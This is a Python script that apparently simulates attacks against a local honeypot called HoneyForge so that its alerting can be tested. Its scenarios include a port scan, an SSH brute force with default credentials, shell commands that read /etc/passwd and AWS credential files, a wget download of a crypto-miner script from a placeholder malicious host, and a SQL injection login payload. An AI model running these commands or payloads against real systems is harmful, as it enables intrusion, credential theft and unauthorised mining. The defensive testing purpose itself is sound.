import socket
import time
import argparse
import urllib.request
import urllib.parse
import json
import paramiko
import sys

if sys.platform.startswith("win"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

def print_banner():
    print("""
======================================================================
  ⚔️  HONEYFORGE LIVE CYBERATTACK SIMULATION SUITE  ⚔️
======================================================================
    """)

def test_low_interaction_scan(host="127.0.0.1", ports=[2121, 2323, 6379]):
    print("\n[*] [SCENARIO 1] Initiating Multi-Port Reconnaissance Scan (Low Interaction)...")
    for p in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((host, p))
            banner = s.recv(256)
            print(f"    [+] Port {p}: OPEN -> Banner received: {banner.decode(errors='ignore').strip()[:60]}")
            s.send(b"PROBE / HTTP/1.0\r\n\r\n")
            s.close()
        except Exception as e:
            print(f"    [-] Port {p}: connection error ({e})")
        time.sleep(0.1)
    print("[✔] Scenario 1 completed! Low-interaction probes recorded.")

def test_ssh_brute_force(host="127.0.0.1", port=2222):
    print("\n[*] [SCENARIO 2] High-Velocity SSH Credential Brute-Force Attack...")
    wordlist = [
        ("root", "toor"),
        ("admin", "admin"),
        ("support", "qwerty"),
        ("deploy", "docker2024"),
        ("root", "123456")
    ]
    for user, pwd in wordlist:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, port=port, username=user, password=pwd, timeout=2.0, look_for_keys=False)
            print(f"    [!] Unexpected success: {user}:{pwd}")
            client.close()
        except paramiko.AuthenticationException:
            print(f"    [+] Auth failed (Captured by Honeypot): {user} : {pwd}")
        except Exception as e:
            print(f"    [-] Connection error: {e}")
        time.sleep(0.1)
    print("[✔] Scenario 2 completed! Brute-force wave logged and alert threshold checked.")

def test_ssh_interactive_session(host="127.0.0.1", port=2222):
    print("\n[*] [SCENARIO 3] Breaching Fake SSH Shell & Post-Exploitation Execution...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # Connect using accepted decoy credentials
        client.connect(host, port=port, username="root", password="admin123", timeout=5.0, look_for_keys=False)
        print("    [✔] Successfully authenticated as 'root' into virtual honeypot shell!")
        
        channel = client.invoke_shell()
        time.sleep(0.5)
        
        commands = [
            "whoami",
            "uname -a",
            "cat /etc/passwd",
            "cat /root/.aws/credentials",  # Triggers Honeytoken!
            "wget http://darknet.xyz/xmrig-miner.sh",  # Triggers Malware Ingestion!
            "exit"
        ]
        
        for cmd in commands:
            print(f"    [>] Executing: {cmd}")
            channel.send(cmd + "\n")
            time.sleep(0.4)
            resp = channel.recv(2048).decode(errors="ignore")
            # Print brief snippet
            lines = [l for l in resp.split("\n") if l.strip() and cmd not in l]
            if lines:
                print(f"        Response: {lines[0].strip()[:70]}")
                
        channel.close()
        client.close()
        print("[✔] Scenario 3 completed! Interactive session, malware payload and honeytoken logged.")
    except Exception as e:
        print(f"    [-] Interactive SSH test error: {e}")

def test_web_admin_attack(host="127.0.0.1", port=8088):
    print("\n[*] [SCENARIO 4] Web Application SQL Injection & Credential Attack...")
    url = f"http://{host}:{port}/login"
    payload = urllib.parse.urlencode({"username": "admin' OR '1'='1", "password": "supersecretpassword"}).encode()
    try:
        req = urllib.request.Request(url, data=payload, headers={"User-Agent": "sqlmap/1.7.2#stable"})
        with urllib.request.urlopen(req, timeout=3.0) as resp:
            print(f"    [+] Web response status: {resp.status}")
    except urllib.error.HTTPError as e:
        print(f"    [+] Trapped Web HTTP status: {e.code} (Captured SQLi & credentials)")
    except Exception as e:
        print(f"    [-] Web trap error: {e}")

def test_canary_honeytoken(server_url="http://127.0.0.1:8000"):
    print("\n[*] [SCENARIO 5] Invoking Planted Canary Honeytoken URL...")
    token_url = f"{server_url}/canary/ht-prod-aws-8821"
    try:
        req = urllib.request.Request(token_url, headers={"User-Agent": "Mozilla/5.0 ExfiltrationBot/1.0"})
        with urllib.request.urlopen(req, timeout=3.0) as resp:
            print(f"    [+] Canary response: {resp.status}")
    except urllib.error.HTTPError as e:
        print(f"    [+] Canary breached! HTTP {e.code} returned, CRITICAL Alert generated in C2!")
    except Exception as e:
        print(f"    [-] Canary error: {e}")

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="HoneyForge Attack Simulator")
    parser.add_argument("--all", action="store_true", help="Run full suite of attack scenarios")
    parser.add_argument("--low", action="store_true", help="Run low-interaction port scan")
    parser.add_argument("--brute", action="store_true", help="Run SSH brute-force attack")
    parser.add_argument("--shell", action="store_true", help="Run interactive shell & malware download")
    parser.add_argument("--web", action="store_true", help="Run fake web admin attack")
    parser.add_argument("--canary", action="store_true", help="Trigger canary honeytoken URL")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--c2", default="http://127.0.0.1:8000", help="C2 Server URL")

    args = parser.parse_args()

    # If no specific flags, default to running all
    if not (args.low or args.brute or args.shell or args.web or args.canary):
        args.all = True

    if args.all or args.low:
        test_low_interaction_scan(args.host)
    if args.all or args.brute:
        test_ssh_brute_force(args.host)
    if args.all or args.shell:
        test_ssh_interactive_session(args.host)
    if args.all or args.web:
        test_web_admin_attack(args.host)
    if args.all or args.canary:
        test_canary_honeytoken(args.c2)

    print("\n" + "="*70)
    print("  [✔] ALL ATTACK SIMULATIONS COMPLETED SUCCESSFULLY!")
    print("  Check the HoneyForge SOC Dashboard at http://localhost:8000")
    print("="*70 + "\n")

if __name__ == "__main__":
    main()
